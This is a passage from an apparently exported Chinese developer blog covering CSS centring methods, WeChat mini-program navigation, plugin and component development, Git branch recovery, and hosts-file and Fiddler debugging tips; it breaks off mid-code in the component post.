    <content type="text"><![CDATA[划重点，这是一道面试必考题，很多面试官都喜欢问这个问题，我就被问过好几次了 要实现上图的效果看似很简单，实则暗藏玄机，本文总结了一下CSS实现水平垂直居中的方式大概有下面这些，本文将逐一介绍一下，原作者将本文整理成了一个github仓库，欢迎大家star 仅居中元素定宽高适用 absolute + 负margin absolute + margin auto absolute + calc 居中元素不定宽高 absolute + transform lineheight writing-mode table css-table flex grid absolute + 负margin 为了实现上面的效果先来做些准备工作，假设HTML代码如下，总共两个元素，父元素和子元素 123 &lt;div class="wp"&gt; &lt;div class="box size"&gt;123123&lt;/div&gt;&lt;/div&gt; wp是父元素的类名，box是子元素的类名，因为有定宽和不定宽的区别，size用来表示指定宽度，下面是所有效果都要用到的公共代码，主要是设置颜色和宽高 注意：后面不在重复这段公共代码，只会给出相应提示 12345678910111213141516 /* 公共代码 */.wp &#123; border: 1px solid red; width: 300px; height: 300px;&#125;.box &#123; background: green; &#125;.box.size&#123; width: 100px; height: 100px;&#125;/* 公共代码 */ 绝对定位的百分比是相对于父元素的宽高，通过这个特性可以让子元素的居中显示，但绝对定位是基于子元素的左上角，期望的效果是子元素的中心居中显示 为了修正这个问题，可以借助外边距的负值，负的外边距可以让元素向相反方向定位，通过指定子元素的外边距为子元素宽度一半的负值，就可以让子元素居中了，css代码如下 1234567891011121314 /* 此处引用上面的公共代码 *//* 此处引用上面的公共代码 *//* 定位代码 */.wp &#123; position: relative;&#125;.box &#123; position: absolute;; top: 50%; left: 50%; margin-left: -50px; margin-top: -50px;&#125; 这是我比较常用的方式，这种方式比较好理解，兼容性也很好，缺点是需要知道子元素的宽高 点击查看完整DEMO absolute + margin auto 这种方式也要求居中元素的宽高必须固定，HTML代码如下 123 &lt;div class="wp"&gt; &lt;div class="box size"&gt;123123&lt;/div&gt;&lt;/div&gt; 这种方式通过设置各个方向的距离都是0，此时再讲margin设为auto，就可以在各个方向上居中了 123456789101112131415 /* 此处引用上面的公共代码 *//* 此处引用上面的公共代码 *//* 定位代码 */.wp &#123; position: relative;&#125;.box &#123; position: absolute;; top: 0; left: 0; right: 0; bottom: 0; margin: auto;&#125; 这种方法兼容性也很好，缺点是需要知道子元素的宽高 点击查看完整DEMO 网友补充原理： 绝对定位元素可以在其包含块内上下左右移动，指定其距离包含块上下左右的距离都为零时，子元素将填充其包含块所有的可用空间，所以 margin 在水平和垂直方向上都有了可分配的空间，此时使用自动外边距就可使子元素居中 absolute + calc 这种方式也要求居中元素的宽高必须固定，所以我们为box增加size类，HTML代码如下 123 &lt;div class="wp"&gt; &lt;div class="box size"&gt;123123&lt;/div&gt;&lt;/div&gt; 感谢css3带来了计算属性，既然top的百分比是基于元素的左上角，那么在减去宽度的一半就好了，代码如下 123456789101112 /* 此处引用上面的公共代码 *//* 此处引用上面的公共代码 *//* 定位代码 */.wp &#123; position: relative;&#125;.box &#123; position: absolute;; top: calc(50% - 50px); left: calc(50% - 50px);&#125; 这种方法兼容性依赖calc的兼容性，缺点是需要知道子元素的宽高 点击查看完整DEMO absolute + transform 还是绝对定位，但这个方法不需要子元素固定宽高，所以不再需要size类了，HTML代码如下 123 &lt;div class="wp"&gt; &lt;div class="box"&gt;123123&lt;/div&gt;&lt;/div&gt; 修复绝对定位的问题，还可以使用css3新增的transform，transform的translate属性也可以设置百分比，其是相对于自身的宽和高，所以可以将translate设置为-50%，就可以做到居中了，代码如下 12345678910111213 /* 此处引用上面的公共代码 *//* 此处引用上面的公共代码 *//* 定位代码 */.wp &#123; position: relative;&#125;.box &#123; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);&#125; 这种方法兼容性依赖translate2d的兼容性 点击查看完整DEMO lineheight 利用行内元素居中属性也可以做到水平垂直居中，HTML代码如下 123 &lt;div class="wp"&gt; &lt;div class="box"&gt;123123&lt;/div&gt;&lt;/div&gt; 把box设置为行内元素，通过text-align就可以做到水平居中，但很多同学可能不知道通过通过vertical-align也可以在垂直方向做到居中，代码如下 12345678910111213141516 /* 此处引用上面的公共代码 *//* 此处引用上面的公共代码 *//* 定位代码 */.wp &#123; line-height: 300px; text-align: center; font-size: 0px;&#125;.box &#123; font-size: 16px; display: inline-block; vertical-align: middle; line-height: initial; text-align: left; /* 修正文字 */&#125; 这种方法需要在子元素中将文字显示重置为想要的效果，同时需要父元素的高度 点击查看完整DEMO writing-mode 很多同学一定和我一样不知道writing-mode属性，感谢@张鑫旭老师的反馈，简单来说writing-mode可以改变文字的显示方向，比如可以通过writing-mode让文字的显示变为垂直方向 12 &lt;div class="div1"&gt;水平方向&lt;/div&gt;&lt;div class="div2"&gt;垂直方向&lt;/div&gt; 123 .div2 &#123; writing-mode: vertical-lr;&#125; 显示效果如下： 12345 水平方向垂直方向 更神奇的是所有水平方向上的css属性，都会变为垂直方向上的属性，比如text-align，通过writing-mode和text-align就可以做到水平和垂直方向的居中了，只不过要稍微麻烦一点 12345 &lt;div class="wp"&gt; &lt;div class="wp-inner"&gt; &lt;div class="box"&gt;123123&lt;/div&gt; &lt;/div&gt;&lt;/div&gt; 12345678910111213141516171819 /* 此处引用上面的公共代码 *//* 此处引用上面的公共代码 *//* 定位代码 */.wp &#123; writing-mode: vertical-lr; text-align: center;&#125;.wp-inner &#123; writing-mode: horizontal-tb; display: inline-block; text-align: center; width: 100%;&#125;.box &#123; display: inline-block; margin: auto; text-align: left;&#125; 这种方法实现起来和理解起来都稍微有些复杂 点击查看完整DEMO table 曾经table被用来做页面布局，现在没人这么做了，但table也能够实现水平垂直居中，但是会增加很多冗余代码 123456789 &lt;table&gt; &lt;tbody&gt; &lt;tr&gt; &lt;td class="wp"&gt; &lt;div class="box"&gt;123123&lt;/div&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/tbody&gt;&lt;/table&gt; tabel单元格中的内容天然就是垂直居中的，只要添加一个水平居中属性就好了 123456 .wp &#123; text-align: center;&#125;.box &#123; display: inline-block;&#125; 这种方法就是代码太冗余，而且也不是table的正确用法 点击查看完整DEMO css-table css新增的table属性，可以让我们把普通元素，变为table元素的现实效果，通过这个特性也可以实现水平垂直居中 123 &lt;div class="wp"&gt; &lt;div class="box"&gt;123123&lt;/div&gt;&lt;/div&gt; 下面通过css属性，可以让div显示的和table一样 12345678 .wp &#123; display: table-cell; text-align: center; vertical-align: middle;&#125;.box &#123; display: inline-block;&#125; 这种方法和table一样的原理，但却没有那么多冗余代码，兼容性也还不错 点击查看完整DEMO flex flex作为现代的布局方案，颠覆了过去的经验，只需几行代码就可以优雅的做到水平垂直居中 123 &lt;div class="wp"&gt; &lt;div class="box"&gt;123123&lt;/div&gt;&lt;/div&gt; 12345 .wp &#123; display: flex; justify-content: center; align-items: center;&#125; 目前在移动端已经完全可以使用flex了，PC端需要看自己业务的兼容性情况 点击查看完整DEMO grid 感谢@一丝姐 反馈的这个方案，css新出的网格布局，由于兼容性不太好，一直没太关注，通过grid也可以实现水平垂直居中 123 &lt;div class="wp"&gt; &lt;div class="box"&gt;123123&lt;/div&gt;&lt;/div&gt; 1234567 .wp &#123; display: grid;&#125;.box &#123; align-self: center; justify-self: center;&#125; 代码量也很少，但兼容性不如flex，不推荐使用 点击查看完整DEMO 总结 下面对比下各个方式的优缺点，肯定又双叒叕该有同学说回字的写法了，简单总结下 PC端有兼容性要求，宽高固定，推荐absolute + 负margin PC端有兼容要求，宽高不固定，推荐css-table PC端无兼容性要求，推荐flex 移动端推荐使用flex 小贴士 ：关于flex的兼容性决方案，请看这里《移动端flex布局实战》 Tables Are Cool col 3 is right-aligned $1600 方法 居中元素定宽高固定 PC兼容性 移动端兼容性 absolute + 负margin 是 ie6+, chrome4+, firefox2+ 安卓2.3+, iOS6+ absolute + margin auto 是 ie6+, chrome4+, firefox2+ 安卓2.3+, iOS6+ absolute + calc 是 ie9+, chrome19+, firefox4+ 安卓4.4+, iOS6+ absolute + transform 否 ie9+, chrome4+, firefox3.5+ 安卓3+, iOS6+ writing-mode 否 ie6+, chrome4+, firefox3.5+ 安卓2.3+, iOS5.1+ lineheight 否 ie6+, chrome4+, firefox2+ 安卓2.3+, iOS6+ table 否 ie6+, chrome4+, firefox2+ 安卓2.3+, iOS6+ css-table 否 ie8+, chrome4+, firefox2+ 安卓2.3+, iOS6+ flex 否 ie10+, chrome4+, firefox2+ 安卓2.3+, iOS6+ grid 否 ie10+, chrome57+, firefox52+ 安卓6+, iOS10.3+ 最近发现很多同学都对css不够重视，这其实是不正确的，比如下面的这么简单的问题都有那么多同学不会，我也是很无语 12 &lt;div class="red blue"&gt;123&lt;/div&gt;&lt;div class="blue red"&gt;123&lt;/div&gt; 1234567 .red &#123; color: red&#125;.blue &#123; color: blue&#125; 问两个div的颜色分别是什么，竟然只有40%的同学能够答对，这40%中还有很多同学不知道为什么，希望这些同学好好补习下CSS基础，下面给大家推荐几本CSS的书籍 CSS设计指南（最好的入门书）图解CSS3（最好的CSS3入门） CSS世界（CSS进阶）CSS揭秘（CSS高手）喜欢看网络资料同学，可以看看MDN的这个 CSS入门教程，强烈推荐，英语好的同学建议看英文版 原文网址：https://yanhaijing.com/css/2018/01/17/horizontal-vertical-center/]]></content>
      <categories>
        <category>CSS</category>
      </categories>
      <tags>
        <tag>居中</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[微信小程序跳转其他小程序]]></title>
    <url>%2Fblob%2F2018-12-25-wechat-applet-jumps-to-other-applets%2F</url>
    <content type="text"><![CDATA[老年模式 https://developers.weixin.qq.com/miniprogram/dev/api/open-api/miniprogram-navigate/wx.navigateToMiniProgram.html 1234567891011 wx.navigateToMiniProgram(&#123; appId: '', path: 'page/index/index?id=123', extraData: &#123; foo: 'bar' &#125;, envVersion: 'develop', success(res) &#123; // 打开成功 &#125;&#125;) 新模式 https://developers.weixin.qq.com/miniprogram/dev/component/navigator.html采用miniProgram模式 12345678 &lt;navigator target="miniProgram" app-id="wx9a52d3a2384642f6" path="page/index/index?id=123" extra-data="&#123;&#123;extraData&#125;&#125;" version="develop" &gt; 打开小程序&lt;/navigator&gt; 123 extraData: &#123; name: 123&#125; 同时要添加跳转声明https://developers.weixin.qq.com/miniprogram/dev/framework/config.html 123 "navigateToMiniProgramAppIdList": [ "wx9a52d3a2384642f6"] 跳转后参数目标小程序可在 App.onLaunch()，App.onShow() 中获取到这份数据。详情 12345678910111213 &#123; path: "page/index/index", query: &#123; id: "123" &#125;, referrerInfo: &#123; appId: "wxac75bf66ed9c6321", // 来源小程序的appid extraData: &#123; name: 123 &#125; &#125;, scene: 1037&#125; 1037 小程序打开小程序1038 从另一个小程序返回 什么条件可以跳转 小程序是不是同一主体，有没有绑定同一微信公众号，都可以跳转]]></content>
      <categories>
        <category>微信小程序</category>
      </categories>
      <tags>
        <tag>跳转其他小程序</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Git 实用站点]]></title>
    <url>%2Fblob%2F2018-12-24-git-utility-site%2F</url>
    <content type="text"><![CDATA[官方文档：https://git-scm.com/docs/git 官方文档中文版：https://git-scm.com/book/zh/v2 progit2-gitbook：https://github.com/bingohuang/progit2-gitbook 脚本 GitHub：https://git-scm.com/book/zh/v2/GitHub-%E8%84%9A%E6%9C%AC-GitHub 脚本 GitHub 服务与钩子配置区域：https://developer.github.com/webhooks/ 高质量的Git中文教程：https://github.com/geeeeeeeeek/git-recipes]]></content>
      <categories>
        <category>Git</category>
      </categories>
      <tags>
        <tag>Git</tag>
        <tag>progit</tag>
        <tag>webhooks</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[button 点击后失去获得的焦点]]></title>
    <url>%2Fblob%2F2018-12-20-lost-focus-after-button-click%2F</url>
    <content type="text"><![CDATA[浏览器默认元素button在鼠标点击后会获得焦点，这时点击键盘就会响应按钮的点击事件。 某些情况下希望禁止响应点击事件的 可以通过点击后主动失去焦点来达到效果 123456789101112 &lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&lt;script&gt; function clickHandler(e)&#123; // 获取当前绑定元素并取消焦点 e.currentTarget.blur(); &#125;&lt;/script&gt;&lt;button onclick="clickHandler(event)"&gt;不会留下痕迹&lt;/button&gt;&lt;/body&gt;&lt;/html&gt;]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>js</tag>
        <tag>button</tag>
        <tag>焦点</tag>
        <tag>失去焦点</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[host 在实际项目中的使用]]></title>
    <url>%2Fblob%2F2018-12-17-the-use-of-host-in-practical-projects%2F</url>
    <content type="text"><![CDATA[今天体会到了实践出真知，回过头来看发现已经有了成熟的案例，大家都在使用，在这里记录我自己下体验。 不对等环境的联调过程 引子 对接外部系统微信、支付宝的支付通道，因为对方只能在线上环境测试且对方不将我方测试域名加入对方线上白名单中，导致我方在测试环境中使用对方线上数据环境测试不能完美进行下去。 因为微信支付宝的实现方式不同，故先解决微信支付的问题。 服务器端配置修改 首先考虑对方只能使用线上域名，故寻求运维，只要进入我方网络该域名转发到测试环境，失败。 因为项目使用的smarty3，且转发的域名使用的配置，在开始修改之前修改代码配置为线上域名。 然后整合我手上掌握的资源，前端服务器（代码+nginx），因完全使用线上域名，故肯定不能请求到测试服务器，失败。 只能考虑使用本机配置host，遂行之，然败矣；验证使用ip直接访问，仍失败，然后在nginx server name 中添加 该ip，访问成功。喜。 接下来使用域名访问还是失败，继续在nginx server name 中添加该域名，访问成功；到此服务器端的配置完成 本机修改 本机除了上面配置的host，还需要如下调整。 因为最终还是需要在手机上配置，所以要想办法把手机的请求转发给服务器，只能使用电脑拦截然后转发到服务器。 拦截使用fiddler代理，拦截手机上的请求。且测试环境smarty日志有输出，成功。 到此使用的工具都调试好了。但是微信还是不能访问成功，因为手机挂代理的时候微信网页授权不能访问（具体原因不明）；这时只能通过先去掉代理，然后手动取得想要的数据，拼接一个线上域名的url；在手机挂代理的情况下访问该地址，有效。 后面就是微信支付成功了。 但是原本功能完好的微信初始化功能、微信扫二维码加备注功能，都因为不能正确执行到wx.ready方法导致页面不能正确显示，故把对应代码注销掉才可以执行。回归测试使用恢复的代码分支原有功能又没有问题，故归结为代理导致的问题。 支付宝的支付 因为有了微信的案例，所以支付宝使用同样的方法进行测试。 百般使用后发现，支付宝里面打开的页面根本不被拦截到，使用了iphone和android都不会被拦截到； 怀疑是自己电脑问题，又换了一台电脑使用fiddler拦截，还是不可以； 咨询了在阿里的同学，也是啥都不知道；建议我配置手机host，找了一块android设备，修改之后不生效，放弃； 最终还是使用查找参数，手动拼接url的方式，而且是测试环境地址，就不需要挂代理。 一直想让程序自动跑不需要人工干预的方式，由于缺少相关经验，浪费不少时间。 不对等环境联调总结 因为开发环境的需要，需要对本机进行管理，如果是手机联调还需要配置代理。。。。 如果测试环境有nginx且有server name，需要在此将生产域名添加进来 修改代码中授权回调地址为生产地址 修改本机host，添加线上域名到测试环境ip的host转发 配置fiddler拦截器 修改手机代理地址 如果出现像微信网页授权在手机配置代理后不能访问的情况，需要手动拼接后续url。 记得要还原手机代理、本机host、修改的代码、nginx配置。 使用工具管理host 推荐使用 SwitchHosts 管理工具 这是一个用于快速切换 hosts 文件的小程序，基于 Electron 开发，同时使用了 React、Ant Design 以及 CodeMirror 等框架/库。 功能特性 快速切换 hosts hosts 文件语法高亮 在线 hosts 方案：适用于多人协作，将host文件放置在网络上供他人使用 系统托盘图标快速切换 macOS: 支持 Alfred workflow 快速切换 工具管理host注意事项 1、运行时要以管理员方式运行，不然会提示无修改权限。在SwitchHosts.exe右键—以管理员身份运行2、如果是绿色单文件版，最好是放在一个文件夹里面再运行，因为会exe所在的目录下生成配置文件和其他文件夹。3、如果双击运行后不能显示SwitchHost界面，但是任务管理器里面能看到SwitchHost的进程，一般是由于hosts文件字符集不统一，导致hosts文件出现乱码，不能被SwitchHost打开，这时候只要删除C:\windows\system32\drivers\etc\hosts 即可。4、如果使用了代理，修改 Hosts 也不会生效。因为浏览器会优先考虑代理工具的代理，建议调试的时候先关闭代理。5、修改了hosts不生效，一般需要重启浏览器，如果是google浏览器可以不用重启，可以借助chrome://net-internals/#dns chrome://net-internals/#sockets 清掉keep-alive 和清浏览器 DNS 缓存。 调试中使用的工具 代理工具 Fiddler4 以及 Charles，其中Fiddler4 可以安装在 Windows上，Charles安装在Mac上。 Android 调试工具 Android 使用adb远程控制，但是需要root权限]]></content>
      <categories>
        <category>Host</category>
      </categories>
      <tags>
        <tag>移动端</tag>
        <tag>Host</tag>
        <tag>Hosts</tag>
        <tag>代理</tag>
        <tag>转发</tag>
        <tag>SwitchHosts</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[host 文件修改与刷新]]></title>
    <url>%2Fblob%2F2018-12-17-modification-and-refresh-of-host-file%2F</url>
    <content type="text"><![CDATA[window环境： hosts文件位置：C:\windows\system32\drivers\etc\hosts 刷新方式： ctrl+r，输入CMD，回车 在命令行执行:ipconfig /flushdns #清除DNS缓存内容。ps:ipconfig /displaydns //显示DNS缓存内容 在window下修改需要管理员权限才可以修改 linux环境 文件位置：/etc/hosts 刷新命令：systemctl restart nscd 作者：jiahao1186来源：CSDN原文：https://blog.csdn.net/jiahao1186/article/details/83011458版权声明：本文为博主原创文章，转载请附上博文链接！ Mac 修改权限 Mac OSX 系统hosts文件的路径。 在Finder中同时按“Shift”“Command”“G”三个键，输入“/etc/hosts”。 更改权限。 右击hosts文件，选择“显示简介”，在“共享与权限”中勾选“读与写权限”。 打开hosts文件。 获取读写权限的hosts已经可以保存修改了。 未获取读写权限的hosts文件无法保存任何修改 使用注意事项： 运行时要以管理员方式运行，不然会提示无修改权限。 如果使用了代理，修改 Hosts 也不会生效。因为浏览器会优先考虑代理工具的代理，建议调试的时候先关闭代理。 修改了hosts不生效，一般需要重启浏览器，如果是google浏览器可以不用重启，可以借助chrome://net-internals/#dns chrome://net-internals/#sockets 清掉keep-alive 和清浏览器 DNS 缓存。 划重点了 在使用完host之后一定要关闭，否则后果自负，切记切记!!! 浏览器Host缓存 和前端相关的前端工程师，后端工程师，产品，测试都有被浏览器的Host缓存折磨疯的经历吧，不停的刷新页面，重启浏览器，开无痕模式，是不是都被我戳中了。这里先提供一些小技巧，然后再推荐一个 Chrome插件，来完美的解决浏览器 Host缓存问题。 小技巧一 按照下图操作即可在控制台查看IP。 小技巧二 又一个简单的查看IP的方法： 小技巧三 这个很装逼，也很强大。分两步不仅可以查看IP还可以清理缓存。Chrome 访问地址：chrome://net-internals/#dns，点击图片上的 clear Host cache 按钮即可清空Host缓存。但是不要着急，还有第二步，只点击这个还是会有问题。 第二步：点击图片左侧篮框的链接，然后点击右侧上方的Flush socket pools按钮。 为什么需要两步呢，应该是第一步是清理Host缓存，第二步是清理掉使用之前缓存创建的 socket 链接，然后再刷新页面就会利用新的 Host 来创建 socket 达到了我们的目的。 小技巧四 为了使页面更快的呈现给用户，也有很多服务器端的，成本的考量，静态资源会缓存在浏览器本地，就是说有一些前端资源压根不向后端发送请求，对于这类资源有一个特征，如下图： 对于这种切Host也没用，但是还是有简单的办法的。打开开发者工具后，然后在刷新按钮上右键就会出现三个选项，这个时候选择第二个或者第三个都可以清理掉这些静态资源的缓存。 小技巧五 本人之前一直使用小技巧三来提升效率并且装逼，但是每次都要打开地址，然后还得切换个页面再点一次还是很麻烦。所以在再推荐一个 Chrome 插件。 重要 重要 重要！安装插件后需要对浏览器做一个配置才可以正常使用，访问网址：chrome://flags/#extensions-on-chrome-urls 然后点击启用，具体如下图： 点击右上角的插件Logo即可完成技巧三的操作，清理Host缓存： 如下图右键即可显示当前页面的IP：]]></content>
      <categories>
        <category>Host</category>
      </categories>
      <tags>
        <tag>Host</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Fiddler 痛点]]></title>
    <url>%2Fblob%2F2018-12-14-fiddler-pain-spot%2F</url>
    <content type="text"><![CDATA[电脑可以上网浏览器不能上网 今天遇到可以ping通百度，但是所有的浏览器都不能上网的情况； 联想到看到过的说明如果电脑异常关机时fiddler没有关闭，代理在重新开机之后没有从系统中移除，这时只需要重新启动fiddler就完美解决；]]></content>
      <categories>
        <category>Fiddler</category>
      </categories>
      <tags>
        <tag>Fiddler</tag>
        <tag>工具</tag>
        <tag>痛点</tag>
        <tag>浏览器不能上网</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[GIT reflog 恢复已删除分支]]></title>
    <url>%2Fblob%2F2018-12-13-git-reflog-restores-deleted-branches%2F</url>
    <content type="text"><![CDATA[语法： git reflog –date=[iso | local | relative] | grep [-w 全词匹配] iso:格式化后的时间时间 local:实际时间 relative：相对时间， 多少天之前 本案例以恢复remove_branch为例 对remove_branch分支操作。 合并develop分支到remove_branch， 在remove_branch分支做了两次commit， 离开remove_branch分支最终删除该分支。 其活动历时 如图： git reflog 会记录所有的HEAD变动记录， 如commit， 分支切换信息。 通过查询最后一次进入分支remove_branch，最后一次离开remove_branch分支这段时间内head的变化来恢复分支。 由图可知remove_branch分支最后一次进入，离开的时间段为2018-07-20 10:06:39 到2018-07-20 10:09:14 搜索这个时间段内的所有记录， 找到最近一次commit的记录 复制第一列的commit id 还原删除分支 从最近一次commit 中检出分支，可重命名，本例chon重命名为：reback_remove_branch git checkout -b reback_remove_branch ddd94a4 作者：changerzhuo来源：CSDN原文：https://blog.csdn.net/changerzhuo_319/article/details/81133533版权声明：本文为博主原创文章，转载请附上博文链接！]]></content>
      <categories>
        <category>Git</category>
      </categories>
      <tags>
        <tag>Git</tag>
        <tag>恢复删除分支</tag>
        <tag>删除分支</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[微信小程序]]></title>
    <url>%2Fblob%2F2018-11-16-wechat-applet%2F</url>
    <content type="text"><![CDATA[导读 微信小程序接入指南小程序开发版本分布]]></content>
      <categories>
        <category>微信小程序</category>
      </categories>
      <tags>
        <tag>微信小程序</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[微信小程插件开发合集]]></title>
    <url>%2Fblob%2F2018-11-16-development-collection-of-wechat-small-procedure-plug-ins%2F</url>
    <content type="text"><![CDATA[版本支持 插件从小程序基础库版本 2.1.0 开始支持页面。 自基础库版本 2.2.2 开始，在插件自身的页面中，插件还可以调用 wx.navigateTo 来进行页面跳转， url 格式与使用 navigator 组件时相仿。 从小程序基础库版本 2.4.0 开始，支持插件所有者小程序跳转到自己的功能页。 导读 首先看几个学习地址，用于方便理解小程序插件的能力。 查找小程序插件 ：官方插件查找地址，截止2018-11-16还不到两页的插件。 小程序插件功能介绍 ：主要用于理解小程序插件的定位和功能。个人类型小程序不能申请，其他类型都可以申请插件功能，一个小程序只能提供一个插件，其他小程序可以申请使用小程序， 小程序插件开发：开发教程。 开始开发 开发插件 创建项目要在代码片段中的新建，选择插件。 开发注意事项 插件请求签名 插件在使用 wx.request 等 API 发送网络请求时，将会额外携带一个签名 HostSign ，用于验证请求来源于小程序插件。这个签名位于请求头中，形如： 1 X-WECHAT-HOSTSIGN: &#123;&quot;noncestr&quot;:&quot;NONCESTR&quot;, &quot;timestamp&quot;:&quot;TIMESTAMP&quot;, &quot;signature&quot;:&quot;SIGNATURE&quot;&#125; 其中， NONCESTR 是一个随机字符串， TIMESTAMP 是生成这个随机字符串和 SIGNATURE 的 UNIX 时间戳。它们是用于计算签名 SIGNATRUE 的参数，签名算法为： 1 SIGNATURE = sha1([APPID, NONCESTR, TIMESTAMP, TOKEN].sort().join(&apos;&apos;)) 插件内跳转 - 在插件页面内如果是导航组件，可以使用相对路径 - 插件执行页面跳转的时候，可以使用 navigator 组件。当插件跳转到自身页面时， url 应设置为这样的形式：plugin-private://PLUGIN_APPID/PATH/TO/PAGE 。需要跳转到其他插件时，也可以这样设置 url 。 - 自基础库版本 2.2.2 开始，在插件自身的页面中，插件还可以调用 wx.navigateTo 来进行页面跳转， url 格式与使用 navigator 组件时相仿。 插件开放配置 &gt; 向第三方小程序开放的所有自定义组件、页面和 js 接口都必须在插件配置文件 plugin.json 列出，格式如下： 123456789 &#123; &quot;publicComponents&quot;: &#123; &quot;hello-component&quot;: &quot;components/hello-component&quot; &#125;, &quot;pages&quot;: &#123; &quot;hello-page&quot;: &quot;pages/hello-page&quot; &#125;, &quot;main&quot;: &quot;index.js&quot;&#125; 插件的限制 插件调用 API 的限制 wx.login 和 wx.requestPayment 在插件中不能使用，但可以通过插件功能页来 获得用户信息 和 进行支付 插件使用组件的限制 在插件开发中，以下组件不能在插件页面中使用： 开放能力（open-type）为以下之一的 button： contact（打开客服会话） getPhoneNumber（获取用户手机号） getUserInfo（获取用户信息） open-data web-view 以下组件的使用对基础库版本有要求： navigator 需要基础库版本 2.1.0 live-player 和 live-pusher 需要基础库版本 2.3.0 插件的功能页 插件功能页 引用：要使用插件功能页，需要先激活功能页特性，配置对应的功能页函数，再使用 &lt;functional-page-navigator&gt; 组件跳转到插件功能页，从而实现对应的功能。 从小程序基础库版本 2.4.0 开始，支持插件所有者小程序跳转到自己的功能页。 注意使用 &lt;functional-page-navigator> 组件跳转到插件功能页的方式，仅在插件的自定义组件中有效，如果在插件页面跳转会在小程序控制台提示下图的错误 真机开发步骤 先预览打开插件所有者小程序 插件项目将插件中 &lt;functional-page-navigator&gt; 中的 version 属性设置为 develop 预览并打开插件 注意：上线前将插件中 &lt;functional-page-navigator&gt; 中的 version 属性设置为 release 用户信息功能页 自基础库版本 2.3.1 起，用户在这个功能页中授权之后，插件就可以直接调用 wx.login 和 wx.getUserInfo 。无需再次进入功能页获取用户信息。name=”loginAndGetUserInfo” 支付功能页 支付功能页插件使用支付功能，需要进行额外的权限申请，申请位置位于管理后台的“小程序插件 -&gt; 基本设置 -&gt; 支付能力”设置项中。name=”requestPayment” 收货地址功能页 自基础库版本 2.4.0 开始支持。name=”chooseAddress”]]></content>
      <categories>
        <category>微信小程序</category>
      </categories>
      <tags>
        <tag>微信小程序</tag>
        <tag>小程序自定义插件</tag>
        <tag>Npm支持</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[微信小程组件开发合集]]></title>
    <url>%2Fblob%2F2018-11-16-wechat-component-development-collection%2F</url>
    <content type="text"><![CDATA[版本支持 从小程序基础库版本 1.6.3 开始支持简洁的组件化编程 开发者工具 1.02.1810190 及以上版本支持全局组件 自基础库版本 2.0.9 开始，还可以在组件绑定数据中包含函数 :host 选择器需要包含基础库 1.7.2 或更高版本的开发者工具支持 外部样式类这个特性从小程序基础库版本 1.9.90 开始支持 全局样式类这个特性从小程序基础库版本 2.2.3 开始支持 从基础库 2.0.9 开始，对象类型的属性和 data 字段中可以包含函数类型的子字段 自小程序基础库版本 2.2.3 起，组件的的生命周期也可以在 lifetimes 字段内进行声明 resize(组件所在的页面尺寸变化，2.4.0开始支持) 抽象节点自小程序基础库版本 1.9.6 开始支持 自定义组件扩展从小程序基础库版本 2.2.3 开始支持。 小程序从基础库版本 2.2.1 、开发者工具从 1.02.1808300 开始支持使用 npm 安装第三方包 导读 首先看几个学习地址，用于方便理解小程序组件的能力。 自定义组件组件模板和样式Component构造器 组件npm开发 开发第三方自定义组件命令行工具小程序自定义组件脚手架 npm支持 自定义组件功能 组件模板 写法与页面模板相同 模板数据绑定 向子组件的属性传递动态数据 1234567 &lt;!-- 引用组件的页面模板 --&gt;&lt;view&gt; &lt;component-tag-name prop-a="&#123;&#123;dataFieldA&#125;&#125;" prop-b="&#123;&#123;dataFieldB&#125;&#125;"&gt; &lt;!-- 这部分内容将被放置在组件 &lt;slot&gt; 的位置上 --&gt; &lt;view&gt;这里是插入到组件slot中的内容&lt;/view&gt; &lt;/component-tag-name&gt;&lt;/view&gt; 注意 自基础库版本 2.0.9 开始，还可以在数据中包含函数 组件的slot 在组件模板中可以提供一个 &lt;slot&gt; 节点，用于承载组件引用时提供的子节点。 支持默认slot和具名slot 注意 slot是view组件的话，查看文档结构，slot的代码和组件代码是同级的 组件样式 不支持的写法 1234 #a &#123; &#125; /* ID选择器在组件中不能使用 */[a] &#123; &#125; /* 属性选择器在组件中不能使用 */button &#123; &#125; /* 标签名选择器在组件中不能使用 */.a &gt; .b &#123; &#125; /* 除非 .a 是 view 组件节点，否则不一定会生效 */ 外部样式类 在 Component 中用 externalClasses 定义段定义若干个外部样式类。这个特性从小程序基础库版本 1.9.90 开始支持 注意：在同一个节点上使用普通样式类和外部样式类时，两个类的优先级是未定义的，因此最好避免这种情况。 1234 /* 组件 custom-component.js */Component(&#123; externalClasses: ['my-class']&#125;) 12 &lt;!-- 组件 custom-component.wxml --&gt;&lt;custom-component class="my-class"&gt;这段文本的颜色由组件外的 class 决定&lt;/custom-component&gt; 全局样式类 如果希望组件外样式类能够完全影响组件内部，可以将组件构造器中的options.addGlobalClass字段置为true。这个特性从小程序基础库版本 2.2.3 开始支持. 组件构造器 在自定义组件的 js 文件中，需要使用 Component() 来注册组件，并提供组件的属性定义、内部数据和自定义方法。 使用 this.data 可以获取内部数据和属性值，但不要直接修改它们，应使用 setData 修改。 从基础库 2.0.9 开始，对象类型的属性和 data 字段中可以包含函数类型的子字段 组件事件 组件间的基本通信方式有以下几种。 WXML 数据绑定：用于父组件向子组件的指定属性设置数据，仅能设置 JSON 兼容数据（自基础库版本 2.0.9 开始，还可以在数据中包含函数）。具体在 组件模板和样式 章节中介绍。 事件：用于子组件向父组件传递数据，可以传递任意数据。 如果以上两种方式不足以满足需要，父组件还可以通过 this.selectComponent 方法获取子组件实例对象，这样就可以直接访问组件的任意数据和方法。 12345 &lt;!-- 监听事件 --&gt;&lt;!-- 当自定义组件触发“myevent”事件时，调用“onMyEvent”方法 --&gt;&lt;component-tag-name bindmyevent="onMyEvent" /&gt;&lt;!-- 或者可以写成 --&gt;&lt;component-tag-name bind:myevent="onMyEvent" /&gt; 123456 // 触发事件onTap: function()&#123; var myEventDetail = 